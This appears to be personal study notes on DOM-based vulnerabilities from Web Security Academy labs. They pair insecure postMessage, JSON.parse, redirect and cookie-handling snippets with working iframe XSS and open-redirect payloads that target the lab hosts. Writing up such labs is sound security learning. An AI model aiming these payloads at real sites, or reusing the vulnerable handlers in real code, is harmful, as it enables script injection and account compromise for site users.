# DOM-based vulnerabilities

## Description

The Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page. Websites can use JavaScript to manipulate the nodes and objects of the DOM, as well as their properties. DOM manipulation in itself is not a problem. In fact, it is an integral part of how modern websites work. However, JavaScript that handles data insecurely can enable various attacks. DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink.

### DOM XSS using web messages through iframe and more

Code in the backend

```
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```

try to exploit it through this i frame, the second argument '*' indicates the allow target origin
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">

to add width and height, set this into the iframe width="200" height="200"

```
<iframe src="https://0aec001b03e2b2a0c0f20a6e004f0013.web-security-academy.net/" width="1200" height="1200" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')" >
```
or
```
<style>
   iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 1;
        z-index: 2;
    }
</style>
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('<img src= 1 onerror=print()>','*')">
```
### DOM XSS using web messages and a JavaScript URL
  
This code that you can find in a page could allow you to trigger an XSS with DOM message
 ```
<script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                    </script>
 ```    
  
You can still exploit it inserting javascript in an URL, the only important thing is that you need to insert http or https protocol, due to the indexOf() function

as follow:
```
 <iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
### DOM XSS using web messages and JSON.parse
   
Sometimes tyou can face this type of vulnerabilities, in which there is the JSON.parse to exploit
```
      window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
        ```                
Example to:
Remember the escape character "\"
```
<iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
     ```                       
### DOM-based open redirection

Sometimes you can face a redirection vulnerabilities

  WHAT IS GOING ON?
  
/url=(https?:\/\/.+)/ -> https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions  
  
```
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```
To exploit it you can modified the link as follow 

https://your-lab-id.web-security-academy.net/post?postId=4&url=https://your-exploit-server-id.web-security-academy.net/


Another vulnerabilities could be related with the cookie
  ```
<script>
  document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
                        </script>
                       ```
Possible payload to exploit it
```
 ``` 
<iframe src="https://your-lab-id.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://your-lab-id.web-security-academy.net';window.x=1;">
```
  
quote:
"The original source of the iframe matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the iframe loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the lastViewedProduct cookie. The onload event handler ensures that the victim is then immediately redirected to the home page, unaware that this manipulation ever took place. While the victim's browser has the poisoned cookie saved, loading the home page will cause the payload to execute."
                        
                        
